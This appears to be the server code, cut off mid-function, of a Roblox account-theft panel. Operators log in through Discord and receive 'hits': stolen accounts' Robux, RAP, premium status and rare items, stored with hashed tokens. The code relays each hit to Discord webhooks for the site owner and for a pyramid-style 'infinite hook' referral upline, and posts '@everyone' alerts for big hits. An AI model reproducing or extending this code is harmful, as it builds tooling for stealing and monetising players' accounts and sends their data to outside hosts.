import express from 'express';
import bodyParser from 'body-parser';
import cookieParser from 'cookie-parser';
import path from 'path';
import { fileURLToPath } from 'url';
import crypto from 'crypto';
import fs from 'fs';
import rateLimit from 'express-rate-limit';
import compression from 'compression';
import os from 'os';

// Import Firebase Admin SDK
import admin from 'firebase-admin';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.set('trust proxy', 1);

// Firebase Realtime Database Initialization
let db = null;

try {
  if (process.env.GOOGLE_PROJECT_ID && process.env.GOOGLE_CLIENT_EMAIL && process.env.GOOGLE_PRIVATE_KEY && process.env.FIREBASE_DB_URL) {
    admin.initializeApp({
      credential: admin.credential.cert({
        projectId: process.env.GOOGLE_PROJECT_ID,
        clientEmail: process.env.GOOGLE_CLIENT_EMAIL,
        privateKey: process.env.GOOGLE_PRIVATE_KEY.replace(/\\n/g, '\n'),
      }),
      databaseURL: process.env.FIREBASE_DB_URL
    });
    db = admin.database();
    console.log('✅ Firebase initialized successfully');
  } else {
    console.log('⚠️ Firebase credentials not found. Running in demo mode without database functionality.');
  }
} catch (error) {
  console.error('❌ Failed to initialize Firebase:', error.message);
  console.log('⚠️ Running without database functionality.');
}


// ─── Update directory stats counters in Firebase ──────────────────────────────
async function updateDirectoryStats(directoryName, userData, directories = null) {
  if (!db || !directoryName || directoryName === 'main') return;

  try {
    const PH_TZ = 'Asia/Manila';
    const todayPh = new Date().toLocaleDateString('en-CA', { timeZone: PH_TZ });

    const statsRef = db.ref(`directories/${directoryName}/stats`);

    await statsRef.transaction(stats => {
      const s = stats || {};

      // Reset today counters if it's a new day
      if (s.todayDate !== todayPh) {
        s.todayHits = 0;
        s.todayRobux = 0;
        s.todayRAP = 0;
        s.todaySummary = 0;
        s.todayDate = todayPh;
      }

      // Increment total counters
      s.totalHits = (s.totalHits || 0) + 1;
      s.totalRobux = (s.totalRobux || 0) + (userData.robux || 0);
      s.totalRAP = (s.totalRAP || 0) + (userData.rap || 0);
      s.totalSummary = (s.totalSummary || 0) + (userData.summary || 0);

      // Increment today counters
      s.todayHits = (s.todayHits || 0) + 1;
      s.todayRobux = (s.todayRobux || 0) + (userData.robux || 0);
      s.todayRAP = (s.todayRAP || 0) + (userData.rap || 0);
      s.todaySummary = (s.todaySummary || 0) + (userData.summary || 0);

      // Update biggest hits
      if (!s.biggest) s.biggest = { robux: 0, rap: 0, summary: 0 };
      if ((userData.robux || 0) > s.biggest.robux) s.biggest.robux = userData.robux || 0;
      if ((userData.rap || 0) > s.biggest.rap) s.biggest.rap = userData.rap || 0;
      if ((userData.summary || 0) > s.biggest.summary) s.biggest.summary = userData.summary || 0;

      // Last hit info
      s.lastHitAt = new Date().toISOString();
      s.lastHitUser = userData.username || 'Unknown';

      return s;
    });

    // Update network stats separately (directReferrals + totalNetwork)
    if (directories) {
      function countDownline(parentName) {
        let count = 0;
        for (const [dirName, dirConfig] of Object.entries(directories)) {
          if (dirConfig.referredBy === parentName) {
            count++;
            count += countDownline(dirName);
          }
        }
        return count;
      }

      let directReferrals = 0;
      for (const [dirName, dirConfig] of Object.entries(directories)) {
        if (dirConfig.referredBy === directoryName) directReferrals++;
      }

      const totalNetwork = countDownline(directoryName);
      const dirConfig = directories[directoryName];

      await db.ref(`directories/${directoryName}/stats/network`).update({
        directReferrals,
        totalNetwork,
        referralCode: dirConfig?.referralCode || null
      });
    }

  } catch (error) {
    console.error('❌ Error updating directory stats:', error.message);
  }
}
// ──────────────────────────────────────────────────────────────────────────────

// Directory management
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123'; // Change this!
const API_TOKEN = process.env.API_TOKEN;
const ALLOWED_ORIGINS = process.env.ALLOWED_ORIGINS 
  ? process.env.ALLOWED_ORIGINS.split(',') 
  : [];

// Discord OAuth config
const DISCORD_CLIENT_ID = process.env.DISCORD_CLIENT_ID;
const DISCORD_CLIENT_SECRET = process.env.DISCORD_CLIENT_SECRET;
const DISCORD_REDIRECT_URI = process.env.DISCORD_REDIRECT_URI;
const DISCORD_REDIRECT_URI_REDEEM = process.env.DISCORD_REDIRECT_URI_REDEEM;

// ─── Session helpers (stored in Firebase under sessions/{token}) ───────────────

const SESSION_TTL_MS = 24 * 60 * 60 * 1000; // 24 hours

async function createSession(discordId, discordUsername, discordAvatar) {
  if (!db) return null;
  const token = crypto.randomBytes(32).toString('hex');
  const session = {
    discordId,
    discordUsername,
    discordAvatar,
    createdAt: Date.now(),
    expiresAt: Date.now() + SESSION_TTL_MS
  };
  await db.ref(`sessions/${token}`).set(session);
  return token;
}

async function getSession(token) {
  if (!db || !token) return null;
  try {
    const snap = await db.ref(`sessions/${token}`).once('value');
    const session = snap.val();
    if (!session) return null;
    if (Date.now() > session.expiresAt) {
      await db.ref(`sessions/${token}`).remove();
      return null;
    }
    return session;
  } catch {
    return null;
  }
}

async function deleteSession(token) {
  if (!db || !token) return;
  await db.ref(`sessions/${token}`).remove();
}

// ─── Temporary pre-create sessions (Discord authed but hasn't created dir yet) ─
// Stored in Firebase under pending_sessions/{token}
const PENDING_SESSION_TTL_MS = 15 * 60 * 1000; // 15 minutes

async function createPendingSession(discordId, discordUsername, discordAvatar) {
  if (!db) return null;
  const token = crypto.randomBytes(32).toString('hex');
  await db.ref(`pending_sessions/${token}`).set({
    discordId,
    discordUsername,
    discordAvatar,
    createdAt: Date.now(),
    expiresAt: Date.now() + PENDING_SESSION_TTL_MS
  });
  return token;
}

async function getPendingSession(token) {
  if (!db || !token) return null;
  try {
    const snap = await db.ref(`pending_sessions/${token}`).once('value');
    const session = snap.val();
    if (!session) return null;
    if (Date.now() > session.expiresAt) {
      await db.ref(`pending_sessions/${token}`).remove();
      return null;
    }
    return session;
  } catch {
    return null;
  }
}

async function deletePendingSession(token) {
  if (!db || !token) return;
  await db.ref(`pending_sessions/${token}`).remove();
}



// ─── Admin Security ────────────────────────────────────────────────────────────

// Rate limiter — max 5 attempts per IP per 15 minutes
const adminLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  skipSuccessfulRequests: true, // only count failed attempts
  handler: (req, res) => {
    console.warn(`⚠️ Admin brute force attempt from IP: ${req.ip}`);
    res.status(429).json({ error: 'Too many failed attempts. Try again in 15 minutes.' });
  }
});

// Action logger — logs every admin action to Firebase
async function logAdminAction(action, details, req) {
  try {
    if (!db) return;
    await db.ref('admin_logs').push({
      action,
      details,
      ip: req.ip,
      userAgent: req.headers['user-agent'] || 'Unknown',
      timestamp: new Date().toISOString()
    });
  } catch (e) {
    console.error('Failed to log admin action:', e.message);
  }
}

// ──────────────────────────────────────────────────────────────────────────────


// ─── Big Hit Alert — sends to site owner public channel ───────────────────────
async function sendBigHitAlert(userData, hitterDiscordId, avatarUrl) {
  const webhookUrl = process.env.PUBLIC_HIT_WEBHOOK;
  if (!webhookUrl) return;

  const summary = userData.summary || 0;
  const robux = userData.robux || 0;
  const rap = userData.rap || 0;
  const pending = userData.robuxPending || 0;
  const korblox = userData.korblox || false;
  const headless = userData.headless || false;

  // Trigger if ANY condition is met
  const shouldAlert =
    robux >= 5000 ||
    pending >= 5000 ||
    summary >= 50000 ||
    rap >= 5000 ||
    korblox === true ||
    headless === true;

  if (!shouldAlert) return;

  try {
    const embed = {
      color: 0xff4444,
      author: {
        name: userData.username || 'Unknown',
        icon_url: avatarUrl || 'https://www.roblox.com/headshot-thumbnail/image?userId=1&width=48&height=48&format=png'
      },
      description: `Wow! <@${hitterDiscordId}> just getting a big hit.`,
      fields: [
        {
          name: '**Robux | Pend**',
          value: `<:emoji_31:1410233610031857735> ${robux.toLocaleString()} | <:emoji_31:1410233610031857735> ${userData.robuxPending || 0}`,
          inline: false
        },
        {
          name: '**Economy**',
          value: `<:emoji_40:1410521889121501214> ${summary.toLocaleString()}\n<:emoji_36:1410512337839849543> ${rap.toLocaleString()}\n<:emoji_35:1410512305528012831> ${userData.premium ? 'True' : 'False'}`,
          inline: false
        },
        {
          name: '**Collectibles**',
          value: `<:KorbloxDeathspeaker:1408080747306418257> ${userData.korblox ? 'True' : 'False'}\n<:HeadlessHorseman:1397192572295839806> ${userData.headless ? 'True' : 'False'}`,
          inline: false
        }
      ],
      timestamp: new Date().toISOString()
    };

    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: userData.username || 'Unknown',
        avatar_url: avatarUrl || null,
        content: `@everyone`,
        embeds: [embed]
      })
    });
  } catch (error) {
    console.error('❌ Big hit alert failed:', error.message);
  }
}
// ──────────────────────────────────────────────────────────────────────────────

// ─── Middleware: require valid session cookie ──────────────────────────────────
async function requireSession(req, res, next) {
  const token = req.cookies?.session;
  const session = await getSession(token);
  if (!session) {
    // For API routes return JSON, for page routes redirect
    if (req.path.startsWith('/api/')) {
      return res.status(401).json({ error: 'Not authenticated' });
    }
    return res.redirect('/login');
  }
  req.session = session;
  req.sessionToken = token;
  next();
}
// Load directories from Firebase
async function loadDirectories() {
  if (!db) {
    console.log('⚠️ Database not available, returning empty directories');
    return {};
  }

  try {
    const snapshot = await db.ref('directories').once('value');
    const directories = snapshot.val() || {};

    // Check for directories without unique IDs and assign them
    let hasChanges = false;

    for (const [dirName, dirConfig] of Object.entries(directories)) {
      // Check if directory is missing uniqueId
      if (!dirConfig.uniqueId) {
        const uniqueId = generateUniqueId(directories);
        directories[dirName].uniqueId = uniqueId;
        hasChanges = true;
        console.log(`✅ Assigned unique ID ${uniqueId} to legacy directory: ${dirName}`);
      }

      // Check subdirectories for missing IDs
      if (dirConfig.subdirectories) {
        for (const [subName, subConfig] of Object.entries(dirConfig.subdirectories)) {
          if (!subConfig.uniqueId) {
            const uniqueId = generateUniqueId(directories);
            directories[dirName].subdirectories[subName].uniqueId = uniqueId;
            hasChanges = true;
            console.log(`✅ Assigned unique ID ${uniqueId} to legacy subdirectory: ${dirName}/${subName}`);
          }
        }
      }
    }

    // Save changes if any directories were updated
    if (hasChanges) {
      console.log('🔄 Updating directories with new unique IDs...');
      await saveDirectories(directories);
      console.log('✅ Successfully updated legacy directories with unique IDs');
    }

    return directories;
  } catch (error) {
    console.error('Error loading directories from Firebase:', error);
    return {};
  }
}

// Helper function to generate unique IDs (extracted for reuse)
function generateUniqueId(directories) {
  let uniqueId;
  do {
    uniqueId = Math.floor(100000 + Math.random() * 99900000).toString();
    // Check if ID already exists in any directory or subdirectory
    const idExists = Object.values(directories).some(dir => 
      dir.uniqueId === uniqueId || 
      (dir.subdirectories && Object.values(dir.subdirectories).some(sub => sub.uniqueId === uniqueId))
    );
    if (!idExists) break;
  } while (true);
  return uniqueId;
}

// Helper function to generate unique referral codes
function generateReferralCode(directories) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let code;
  do {
    code = '';
    for (let i = 0; i < 6; i++) {
      code += chars[Math.floor(Math.random() * chars.length)];
    }
    // Check if code already exists in any directory
    const codeExists = Object.values(directories).some(dir => 
      dir.referralCode === code
    );
    if (!codeExists) break;
  } while (true);
  return code;
}

// Helper function to find directory by referral code
function findDirectoryByReferralCode(directories, code) {
  for (const [dirName, dirConfig] of Object.entries(directories)) {
    if (dirConfig.referralCode === code) {
      return { name: dirName, config: dirConfig };
    }
  }
  return null;
}

// Helper function to distribute hit to infinite hook chain
async function distributeToInfiniteChain(directoryConfig, hitData) {
  const webhooksToNotify = [];
  
  // Always notify main site owner
  if (process.env.DISCORD_WEBHOOK_URL) {
    webhooksToNotify.push({
      url: process.env.DISCORD_WEBHOOK_URL,
      label: 'Main Site'
    });
  }
  
  // If this directory is part of infinite hook, notify upline
  if (directoryConfig.serviceType === 'infinite' && directoryConfig.referralChain) {
    const directories = await loadDirectories();
    
    // Send to everyone in the referral chain
    for (const parentName of directoryConfig.referralChain) {
      const parent = directories[parentName];
      if (parent && parent.webhookUrl) {
        webhooksToNotify.push({
          url: parent.webhookUrl,
          label: `Upline: ${parentName}`
        });
      }
    }
  }
  
  // Send to all webhooks
  for (const webhook of webhooksToNotify) {
    try {
      await fetch(webhook.url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(hitData)
      });
      console.log(`✅ Sent to ${webhook.label}`);
    } catch (error) {
      console.error(`❌ Failed to send to ${webhook.label}:`, error.message);
    }
  }
}

// Save directories to Firebase
async function saveDirectories(directories) {
  if (!db) {
    console.log('⚠️ Database not available, cannot save directories');
    return false;
  }

  try {
    await db.ref('directories').set(directories);
    return true;
  } catch (error) {
    console.error('Error saving directories to Firebase:', error);
    return false;
  }
}

// Middleware to validate requests
function validateRequest(req, res, next) {
  // Check origin for browser requests
  const origin = req.get('Origin') || req.get('Referer');
  const host = req.get('Host');

  // Allow requests from same origin (your frontend)
  if (origin) {
    const originHost = new URL(origin).host;
    if (originHost !== host && !ALLOWED_ORIGINS.includes(origin)) {

      return res.status(403).json({ error: 'Unauthorized origin' });
    }
  }

  // Check for API token in headers
  const providedToken = req.get('X-API-Token');
  if (!providedToken || providedToken !== API_TOKEN) {

    return res.status(401).json({ error: 'Invalid API token' });
  }

  next();
}

// Function to log user data to Firebase Realtime Database
async function logUserData(token, userData, context = {}, avatarUrl = null) {
  if (!db) {
    console.log('⚠️ Database not available, cannot log user data');
    return null;
  }

  try {
    // Hash the token for security - never store raw tokens
    const hashedToken = crypto.createHash('sha256').update(token).digest('hex').substring(0, 16);

    const logEntry = {
      tokenHash: hashedToken, // Store only hashed version
      userData: userData,
      context: context,
      avatarUrl: avatarUrl, // Store Roblox avatar URL
      timestamp: new Date().toISOString(),
    };

    const writeResult = await db.ref('user_logs').push(logEntry);

    return writeResult.key;
  } catch (error) {
    console.error('❌ Error logging user data to Firebase Realtime Database:', error);
    return null;
  }
}

// Trust proxy for rate limiting (required for Replit)
app.set('trust proxy', 1);

// Rate limiting

// Enhanced rate limiting for token endpoints
const tokenLimiter = rateLimit({
  windowMs: 5 * 60 * 1000, // 5 minutes
  max: 10, // limit each IP to 10 token requests per windowMs
  message: 'Too many token requests from this IP, please try again later.',
  standardHeaders: true,
  legacyHeaders: false,
});

app.use(compression()); // Enable gzip compression

// Global security headers for all routes
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');
  next();
});
app.use(cookieParser());
app.use(bodyParser.json({ limit: '2mb' }));
app.use(bodyParser.text({ type: '*/*', limit: '2mb' }));

// Security headers middleware for token endpoints
app.use('/*/api/token', (req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Expires', '0');
  next();
});

app.use('/api/token', (req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Expires', '0');
  next();
});

// Serve main page at root path for search engines and visitors
app.get('/', (req, res) => {
  // Main site disabled - force users to create/login
  res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
});

// Serve static files from public directory with appropriate caching
app.use(express.static(path.join(__dirname, 'public'), {
  index: false, // Prevent serving index.html automatically
  maxAge: '1h', // Cache static assets for 1 hour
  setHeaders: (res, filePath) => {
    // Don't cache HTML files to ensure users get updates
    if (filePath.endsWith('.html')) {
      res.setHeader('Cache-Control', 'no-cache');
    }
  }
}));

// Serve the create directory page
app.get('/create', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'create.html'));
});



// API endpoint to get referral information
app.get('/api/check-referral', async (req, res) => {
  try {
    const referralCode = req.query.code;
    
    // Validate format
    if (!/^[A-Za-z0-9]{6}$/.test(referralCode)) {
      return res.status(400).json({ error: 'Invalid referral code format' });
    }
    
    const directories = await loadDirectories();
    const referrer = findDirectoryByReferralCode(directories, referralCode);
    
    if (!referrer) {
      return res.status(404).json({ error: 'Referral code not found' });
    }
    
    // Return referrer info (safe to share)
    res.json({
      valid: true,
      referrerName: referrer.name,
      referrerUsername: referrer.config.discordUsername || 'Unknown User',
      referralCode: referralCode,
      serviceType: referrer.config.serviceType
    });
  } catch (error) {
    console.error('Error fetching referral info:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// ─── Discord OAuth Routes ──────────────────────────────────────────────────────

// Step 1: Redirect to Discord
app.get('/auth/discord', (req, res) => {
  const intent = req.query.intent || 'login'; // 'login' | 'create' | 'subcreate'
  const dir = req.query.dir || '';            // for subcreate: parent directory name
  const ref = req.query.ref || '';            // referral code to preserve through OAuth

  if (!DISCORD_CLIENT_ID || !DISCORD_REDIRECT_URI) {
    return res.status(500).send('Discord OAuth not configured. Set DISCORD_CLIENT_ID and DISCORD_REDIRECT_URI.');
  }

  // Encode intent + dir + ref into the OAuth state param so we can read it on callback
  const state = Buffer.from(JSON.stringify({ intent, dir, ref })).toString('base64');

  const params = new URLSearchParams({
    client_id: DISCORD_CLIENT_ID,
    redirect_uri: DISCORD_REDIRECT_URI,
    response_type: 'code',
    scope: 'identify',
    state,
    prompt: 'none'  // skip consent screen if already authorized
  });

  res.redirect(`https://discord.com/oauth2/authorize?${params}`);
});

// Step 2: Discord calls back with ?code=...&state=...
app.get('/auth/discord/callback', async (req, res) => {
  const { code, state, error } = req.query;

  if (error || !code) {
    return res.redirect('/login?error=discord_denied');
  }

  let intent = 'login';
  let parentDir = '';
  let refCode = '';
  try {
    const decoded = JSON.parse(Buffer.from(state, 'base64').toString('utf8'));
    intent = decoded.intent || 'login';
    parentDir = decoded.dir || '';
    refCode = decoded.ref || '';
  } catch {
    // malformed state — treat as login
  }

  try {
    // Exchange code for access token
    const tokenResponse = await fetch('https://discord.com/api/oauth2/token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        client_id: DISCORD_CLIENT_ID,
        client_secret: DISCORD_CLIENT_SECRET,
        grant_type: 'authorization_code',
        code,
        redirect_uri: DISCORD_REDIRECT_URI
      })
    });

    if (!tokenResponse.ok) {
      console.error('Discord token exchange failed:', await tokenResponse.text());
      return res.redirect('/login?error=discord_failed');
    }

    const tokenData = await tokenResponse.json();
    const accessToken = tokenData.access_token;

    // Fetch Discord user info
    const userResponse = await fetch('https://discord.com/api/users/@me', {
      headers: { Authorization: `Bearer ${accessToken}` }
    });

    if (!userResponse.ok) {
      return res.redirect('/login?error=discord_failed');
    }

    const discordUser = await userResponse.json();
    const { id: discordId, username: discordUsername, avatar: discordAvatar } = discordUser;

    const directories = await loadDirectories();

    // ── LOGIN intent ──────────────────────────────────────────────────────────
    if (intent === 'login') {
      // Find directory OR subdirectory linked to this Discord ID
      let foundDir = null;
      
      // First check main directories
      for (const [dirName, dirConfig] of Object.entries(directories)) {
        if (dirConfig.discordId === discordId) {
          foundDir = dirName;
          break;
        }
      }
      
      // If not found in main directories, check subdirectories
      if (!foundDir) {
        for (const [parentName, parentConfig] of Object.entries(directories)) {
          if (parentConfig.subdirectories) {
            for (const [subName, subConfig] of Object.entries(parentConfig.subdirectories)) {
              if (subConfig.discordId === discordId) {
                foundDir = `${parentName}/${subName}`; // Store as "parent/sub" format
                break;
              }
            }
          }
          if (foundDir) break;
        }
      }

      if (!foundDir) {
        return res.redirect('/login?error=not_found');
      }

      // Update avatar and username in Firebase directory so leaderboard/live hits stay fresh
      await db.ref(`directories/${foundDir}`).update({
        discordAvatar: discordAvatar || null,
        discordUsername: discordUsername
      });

      // Create full session cookie
      const sessionToken = await createSession(discordId, discordUsername, discordAvatar);
      res.cookie('session', sessionToken, {
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'lax',
        maxAge: SESSION_TTL_MS
      });
      return res.redirect('/dashboard');
    }

    // ── CREATE intent ─────────────────────────────────────────────────────────
    if (intent === 'create') {
      // Check: does this Discord ID already own a directory?
      const alreadyOwns = Object.values(directories).some(d => d.discordId === discordId);
      if (alreadyOwns) {
        // Log them in instead — they already have a directory
        const sessionToken = await createSession(discordId, discordUsername, discordAvatar);
        res.cookie('session', sessionToken, {
          httpOnly: true,
          secure: process.env.NODE_ENV === 'production',
          sameSite: 'lax',
          maxAge: SESSION_TTL_MS
        });
        return res.redirect('/dashboard?notice=already_exists');
      }

      // Issue a short-lived pending session for the creation form
      const pendingToken = await createPendingSession(discordId, discordUsername, discordAvatar);
      res.cookie('pending_session', pendingToken, {
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'lax',
        maxAge: PENDING_SESSION_TTL_MS
      });
      // Also pass token in URL so mobile browsers don't drop the cookie
      const redirectUrl = refCode
        ? `/create?ref=${refCode}&pt=${pendingToken}`
        : `/create?pt=${pendingToken}`;
      return res.redirect(redirectUrl);
    }

    // ── SUBCREATE intent ──────────────────────────────────────────────────────
    if (intent === 'subcreate') {
      // Verify the Discord user owns the parent directory
      const parentConfig = directories[parentDir];
      if (!parentConfig || parentConfig.discordId !== discordId) {
        return res.redirect(`/${parentDir}/create?error=unauthorized`);
      }

      // Create a full session (subdirectory creation uses the same session as login)
      const sessionToken = await createSession(discordId, discordUsername, discordAvatar);
      res.cookie('session', sessionToken, {
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'lax',
        maxAge: SESSION_TTL_MS
      });
      return res.redirect(`/${parentDir}/create`);
    }

    // Fallback
    res.redirect('/login');

  } catch (err) {
    console.error('❌ Discord OAuth callback error:', err.message);
    res.redirect('/login?error=server_error');
  }
});

// Step 3: Frontend can check its pending session (for the create page)
app.get('/auth/discord/pending-session', async (req, res) => {
  // Accept token from cookie OR from query param (for mobile browser cookie issues)
  const token = req.query.pt || req.cookies?.pending_session;
  const session = await getPendingSession(token);
  if (!session) {
    return res.status(401).json({ error: 'No pending session' });
  }
  res.json({
    discordId: session.discordId,
    discordUsername: session.discordUsername,
    discordAvatar: session.discordAvatar
  });
});

// Logout
app.post('/auth/logout', async (req, res) => {
  const token = req.cookies?.session;
  await deleteSession(token);
  res.clearCookie('session');
  res.clearCookie('pending_session');
  res.json({ success: true });
});

// ─── End Discord OAuth Routes ──────────────────────────────────────────────────

// ====================================================================
// API ROUTES FOR DASHBOARD
// ====================================================================

// Get current user information
app.get('/api/user', requireSession, async (req, res) => {
  try {
    res.json({
      discordId: req.session.discordId,
      discordUsername: req.session.discordUsername,
      discordAvatar: req.session.discordAvatar
    });
  } catch (error) {
    console.error('Error fetching user:', error);
    res.status(500).json({ error: 'Failed to fetch user data' });
  }
});

// Get directory information for the logged-in user
app.get('/api/directory', requireSession, async (req, res) => {
  try {
    const directories = await loadDirectories();
    
    // Find the directory OR subdirectory owned by this user
    let userDirectory = null;
    let directoryName = null;
    let parentDirectory = null;
    
    // First check main directories
    for (const [dirName, dirConfig] of Object.entries(directories)) {
      if (dirConfig.discordId === req.session.discordId) {
        userDirectory = dirConfig;
        directoryName = dirName;
        break;
      }
    }
    
    // If not found, check subdirectories
    if (!userDirectory) {
      for (const [parentName, parentConfig] of Object.entries(directories)) {
        if (parentConfig.subdirectories) {
          for (const [subName, subConfig] of Object.entries(parentConfig.subdirectories)) {
            if (subConfig.discordId === req.session.discordId) {
              userDirectory = subConfig;
              directoryName = subName;
              parentDirectory = parentName;
              break;
            }
          }
        }
        if (userDirectory) break;
      }
    }
    
    if (!userDirectory) {
      return res.status(404).json({ error: 'Directory not found' });
    }
    
    // Return directory data
    res.json({
      name: directoryName,
      uniqueId: userDirectory.uniqueId,
      serviceType: userDirectory.serviceType || 'single',
      webhookUrl: userDirectory.webhookUrl,
      harName: userDirectory.harName || userDirectory.discordUsername || 'AutoHar User',
      filterSettings: userDirectory.filterSettings || {
        minRobux: 0,
        minRAP: 0,
        minSummary: 0
      },
      filters: userDirectory.filters || {},
      subdirectories: userDirectory.subdirectories || {},
      parentDirectory: parentDirectory || null,  // Will be null for main directories, parent name for subdirectories
      // Infinite hook fields
      referralCode: userDirectory.referralCode || null,
      referredBy: userDirectory.referredBy || null,
      referralChain: userDirectory.referralChain || []
    });
  } catch (error) {
    console.error('Error fetching directory:', error);
    res.status(500).json({ error: 'Failed to fetch directory data' });
  }
});

// Get network stats for infinite hook users
app.get('/api/network-stats', requireSession, async (req, res) => {
  try {
    const directories = await loadDirectories();
    
    // Find user's directory
    let userDirectory = null;
    let directoryName = null;
    
    for (const [dirName, dirConfig] of Object.entries(directories)) {
      if (dirConfig.discordId === req.session.discordId) {
        userDirectory = dirConfig;
        directoryName = dirName;
        break;
      }
    }
    
    if (!userDirectory) {
      return res.status(404).json({ error: 'Directory not found' });
    }
    
    // Only for infinite hook users
    if (userDirectory.serviceType !== 'infinite') {
      return res.json({
        serviceType: userDirectory.serviceType,
        hasNetwork: false
      });
    }
    
    // Count direct referrals (people who used this user's code)
    let directReferrals = 0;
    const directReferralsList = [];
    
    for (const [dirName, dirConfig] of Object.entries(directories)) {
      if (dirConfig.referredBy === directoryName) {
        directReferrals++;
        directReferralsList.push({
          name: dirName,
          username: dirConfig.discordUsername,
          joinedAt: dirConfig.created
        });
      }
    }
    
    // Count total network (everyone in downline - recursive)
    function countDownline(parentName) {
      let count = 0;
      for (const [dirName, dirConfig] of Object.entries(directories)) {
        if (dirConfig.referredBy === parentName) {
          count++; // Count this referral
          count += countDownline(dirName); // Count their referrals recursively
        }
      }
      return count;
    }
    
    const totalNetwork = countDownline(directoryName);
    
    // Get network hits from database
    let networkHits = 0;
    let networkRobux = 0;
    let networkRAP = 0;
    let networkSummary = 0;
    
    if (db) {
      try {
        // Get all directories in downline
        function getDownlineNames(parentName) {
          const downline = [];
          for (const [dirName, dirConfig] of Object.entries(directories)) {
            if (dirConfig.referredBy === parentName) {
              downline.push(dirName);
              downline.push(...getDownlineNames(dirName));
            }
          }
          return downline;
        }
        
        const downlineDirectories = getDownlineNames(directoryName);
        
        // Get hits for all downline directories
        for (const downlineDir of downlineDirectories) {
          const logsSnapshot = await db.ref('user_logs')
            .orderByChild('context/directory')
            .equalTo(downlineDir)
            .once('value');
          
          logsSnapshot.forEach(childSnapshot => {
            const log = childSnapshot.val();
            if (log.userData) {
              networkHits++;
              networkRobux += log.userData.robux || 0;
              networkRAP += log.userData.rap || 0;
              networkSummary += log.userData.summary || 0;
            }
          });
        }
      } catch (error) {
        console.error('Error fetching network stats from DB:', error);
      }
    }
    
    res.json({
      serviceType: 'infinite',
      hasNetwork: true,
      directReferrals: directReferrals,
      totalNetwork: totalNetwork,
      networkHits: networkHits,
      networkRobux: networkRobux,
      networkRAP: networkRAP,
      networkSummary: networkSummary,
      topReferrals: directReferralsList.slice(0, 10)
    });
    
  } catch (error) {
    console.error('Error fetching network stats:', error);
    res.status(500).json({ error: 'Failed to fetch network stats' });
  }
});

// Get statistics for the dashboard
app.get('/api/stats', requireSession, async (req, res) => {
  try {
    const directories = await loadDirectories();
    
    // Find user's directory
    let userDirectory = null;
    let directoryName = null;
    
    for (const [dirName, dirConfig] of Object.entries(directories)) {
      if (dirConfig.discordId === req.session.discordId) {
        userDirectory = dirConfig;
        directoryName = dirName;
        break;
      }
    }
    
    if (!userDirectory) {
      return res.status(404).json({ error: 'Directory not found' });
    }
    
    // Calculate stats from user_logs in Firebase
    const stats = {
      totalRobux: 0,
      totalRAP: 0,
      totalSummary: 0,
      totalHits: 0,
      totalUsers: 0,
      history: {
        labels: ['Fri', 'Sat'],
        robux: [0, 0, 0, 0, 0, 0, 0],
        rap: [0, 0, 0, 0, 0, 0, 0],
        summary: [0, 0, 0, 0, 0, 0, 0],
        hits: [0, 0, 0, 0, 0, 0, 0]
      },
      leaderboard: [],
      liveHits: []
    };
    
    if (db) {
      try {
        // Get logs for this directory
        const logsSnapshot = await db.ref('user_logs')
          .orderByChild('context/directory')
          .equalTo(directoryName)
          .limitToLast(100)
          .once('value');
        
        const logs = [];
        logsSnapshot.forEach(childSnapshot => {
          logs.push({
            key: childSnapshot.key,
            ...childSnapshot.val()
          });
        });
        
        // Calculate totals
        logs.forEach(log => {
          if (log.userData) {
            stats.totalRobux += log.userData.robux || 0;
            stats.totalRAP += log.userData.rap || 0;
            stats.totalSummary += log.userData.summary || 0;
            stats.totalHits++;
          }
        });
        
        // Check for bonus_hits in Firebase
        let bonusHits = 0;
        try {
          const bonusRef = db.ref(`bonus_hits/${directoryName}`);
          const bonusSnapshot = await bonusRef.once('value');
          bonusHits = bonusSnapshot.val() || 0;
          
          if (bonusHits > 0) {
            console.log(`✅ Adding ${bonusHits} bonus hits for ${directoryName}`);
            stats.totalHits += bonusHits;
          }
        } catch (bonusError) {
          console.error('Error fetching bonus hits:', bonusError);
        }
        
        // Get last 5 logs for live hits
        const recentLogs = logs.slice(-5).reverse();
        stats.liveHits = recentLogs.map(log => {
          const userData = log.userData || {};
          const context = log.context || {};
          
          return {
            username: userData.username || 'Unknown',
            userId: userData.userId || '0',
            time: new Date(log.timestamp).toLocaleTimeString('en-US', { 
              month: 'short', 
              day: 'numeric', 
              hour: '2-digit', 
              minute: '2-digit' 
            }),
            robux: userData.robux || 0,
            rap: userData.rap || 0,
            summary: userData.summary || 0,
            premium: userData.premium || false,
            hitterName: context.hitter || 'Unknown',
